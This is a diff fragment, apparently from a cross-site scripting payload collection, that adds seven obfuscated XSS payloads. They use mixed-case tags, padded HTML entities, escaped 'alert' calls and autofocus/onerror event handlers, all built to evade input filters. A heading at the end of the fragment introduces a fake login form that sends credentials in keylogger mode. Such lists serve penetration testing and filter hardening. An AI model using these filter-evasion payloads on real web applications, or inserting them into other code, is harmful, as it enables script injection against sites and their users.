@@ -7,6 +7,13 @@
 <sCriPt>window.location='javascript:alert(0)';</sCRipT>
 <iNpUt &gt; id="x"onfocus="window['\a\l\ert']()" autofocus />
 <iNpUt type=im&#x000000000000000000000000000000061;ge &gt; id="x"oNerRor="window['\a\l\ert']()" src />
+<iNpUt %253e onfocus="&#x000000000000000000000000000000061;lert()" autofocus />
+<iNpUt x="&quot; /> " id=""onfocus="window['\a\l\ert']()" autofocus/>
+<iNpUt x="&#x22; /> " id=""onfocus="window['\a\l\ert']()" autofocus/> 
+<iNpUt x='&#39; /> ' id=""onfocus="window['\a\l\ert']()" autofocus/>
+<iNpUt /&#62; id=""onfocus="window['\a\l\ert']()" autofocus/>
+<iMG src &gt; onerror="alert&#x000000028;&#x29;" />
+<iMG src onload=%ff%00%ffAAA onerror=alert() />
 ```
 
 ### Fake authentication form sending credentials in keylogger mode
